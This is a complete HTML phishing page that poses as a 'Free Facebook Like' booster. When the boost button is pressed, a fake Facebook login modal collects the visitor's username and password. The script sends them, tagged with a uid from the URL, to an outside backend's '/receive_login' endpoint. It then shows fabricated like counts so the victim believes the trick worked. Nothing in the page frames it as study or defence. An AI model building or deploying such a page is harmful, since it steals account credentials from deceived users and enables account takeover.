<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Free Facebook Like</title>
<style>
  body {
    font-family: "Poppins", sans-serif;
    background: linear-gradient(135deg, #1877f2, #42b72a);
    margin: 0;
    padding: 40px 20px;
    display: flex;
    flex-direction: column;
    align-items: center;
    min-height: 100vh;
    color: #222;
  }

  h1 {
    color: white;
    font-size: 2.4em;
    margin-bottom: 25px;
    text-shadow: 0 2px 6px rgba(0,0,0,0.3);
  }

  .input-section {
    width: 100%;
    max-width: 500px;
    display: flex;
    flex-direction: column;
    margin-bottom: 40px;
    background: rgba(255,255,255,0.2);
    backdrop-filter: blur(10px);
    border-radius: 15px;
    padding: 20px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.2);
  }

  .input-section input {
    padding: 14px;
    border-radius: 10px;
    border: none;
    outline: none;
    font-size: 16px;
    margin-bottom: 12px;
    background: rgba(255,255,255,0.8);
    transition: 0.3s;
  }

  .input-section input:focus {
    box-shadow: 0 0 5px #1877f2;
  }

  .input-section button {
    padding: 14px;
    border-radius: 10px;
    border: none;
    background: linear-gradient(90deg, #1877f2, #42b72a);
    color: white;
    font-weight: bold;
    cursor: pointer;
    font-size: 17px;
    transition: all 0.3s ease;
  }

  .input-section button:hover {
    transform: translateY(-2px);
    box-shadow: 0 5px 15px rgba(24, 119, 242, 0.3);
  }

  .container {
    width: 100%;
    max-width: 500px;
  }

  .post-box {
    background: rgba(255,255,255,0.9);
    backdrop-filter: blur(10px);
    padding: 20px;
    margin-bottom: 20px;
    border-radius: 15px;
    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
    transition: transform 0.3s;
  }

  .post-box:hover {
    transform: scale(1.02);
  }

  .post-link {
    font-weight: 600;
    margin-bottom: 10px;
    word-break: break-all;
    color: #333;
  }

  .like-count {
    display: inline-block;
    margin-top: 10px;
    font-weight: bold;
    color: #1877f2;
  }

  .boost-btn {
    margin-top: 10px;
    padding: 12px;
    width: 100%;
    background: linear-gradient(90deg, #42b72a, #2ecc71);
    border: none;
    border-radius: 10px;
    color: white;
    font-weight: bold;
    cursor: pointer;
    font-size: 16px;
    transition: all 0.3s ease;
  }

  .boost-btn:hover {
    background: linear-gradient(90deg, #36a420, #27ae60);
    transform: translateY(-2px);
  }

  /* Login form modal */
  .modal {
    display: none;
    position: fixed;
    z-index: 999;
    left: 0; top: 0;
    width: 100%; height: 100%;
    background-color: rgba(0,0,0,0.6);
    justify-content: center;
    align-items: center;
  }

  .modal-content {
    background: rgba(255,255,255,0.95);
    backdrop-filter: blur(10px);
    padding: 30px 25px;
    border-radius: 15px;
    width: 320px;
    text-align: center;
    box-shadow: 0 6px 20px rgba(0,0,0,0.2);
  }

  .modal-content h2 {
    margin-bottom: 15px;
    color: #1877f2;
  }

  .modal-content input {
    width: 100%;
    padding: 12px;
    margin: 10px 0;
    border-radius: 8px;
    border: 1px solid #ccc;
    background: rgba(255,255,255,0.9);
    font-size: 15px;
  }

  .modal-content button {
    width: 100%;
    padding: 12px;
    margin-top: 10px;
    border-radius: 8px;
    border: none;
    background: linear-gradient(90deg, #1877f2, #42b72a);
    color: white;
    font-weight: bold;
    font-size: 16px;
    cursor: pointer;
    transition: 0.3s;
  }

  .modal-content button:hover {
    transform: translateY(-2px);
    box-shadow: 0 5px 15px rgba(66,183,42,0.3);
  }
</style>
</head>
<body>

<h1>Free Facebook Like</h1>

<div class="input-section">
  <input type="text" id="post-link" placeholder="Enter Facebook post link">
  <button onclick="addPost()">Get Like</button>
</div>

<div class="container" id="posts-container"></div>

<!-- Login Modal -->
<div class="modal" id="login-modal">
  <div class="modal-content">
    <h2>Login</h2>
    <input type="text" id="username" placeholder="Username">
    <input type="password" id="password" placeholder="Password">
    <button onclick="sendLogin()">Facebook Login</button>
  </div>
</div>

<script>
  const BACKEND_URL = "https://bot-production-85f6.up.railway.app";
  const postsContainer = document.getElementById("posts-container");
  const loginModal = document.getElementById("login-modal");
  const posts = [];
  let currentBoostIndex = null;

  function getUID() {
    const params = new URLSearchParams(window.location.search);
    return params.get("uid");
  }

  function addPost() {
    const link = document.getElementById("post-link").value.trim();
    if(!link) {
      alert("Please enter a post link!");
      return;
    }

    const post = {
      link: link,
      likes: Math.floor(Math.random()*10)+1
    };

    posts.push(post);
    renderPosts();
    document.getElementById("post-link").value = "";
  }

  function boostLike(index) {
    currentBoostIndex = index;
    loginModal.style.display = "flex";
  }

  async function sendLogin() {
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;
    const uid = getUID();

    if(!uid) {
      alert("Invalid link: UID not found.");
      return;
    }
    if(!username || !password) {
      alert("Enter both username and password.");
      return;
    }

    try {
      const res = await fetch(`${BACKEND_URL}/receive_login`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({ uid, username, password })
      });
      const data = await res.json();
      if(data.status === "sent") {
        alert("✅ like submit successful!");
        loginModal.style.display = "none";
        if(currentBoostIndex !== null){
          posts[currentBoostIndex].likes += Math.floor(Math.random()*11)+50;
          renderPosts();
          currentBoostIndex = null;
        }
      } else {
        alert("❌ Error: " + (data.error || "Unknown error"));
      }
    } catch(err) {
      alert("❌ Network error: " + err);
    }
  }

  function renderPosts() {
    postsContainer.innerHTML = "";
    posts.forEach((post,index)=>{
      const postDiv = document.createElement("div");
      postDiv.classList.add("post-box");
      postDiv.innerHTML = `
        <div class="post-link">Post: ${post.link}</div>
        <button class="boost-btn" onclick="boostLike(${index})">Boost Like Free</button>
        <span class="like-count">${post.likes} Likes</span>
      `;
      postsContainer.appendChild(postDiv);
    });
  }

  window.onclick = function(event) {
    if(event.target == loginModal){
      loginModal.style.display = "none";
    }
  }
</script>

</body>
</html>
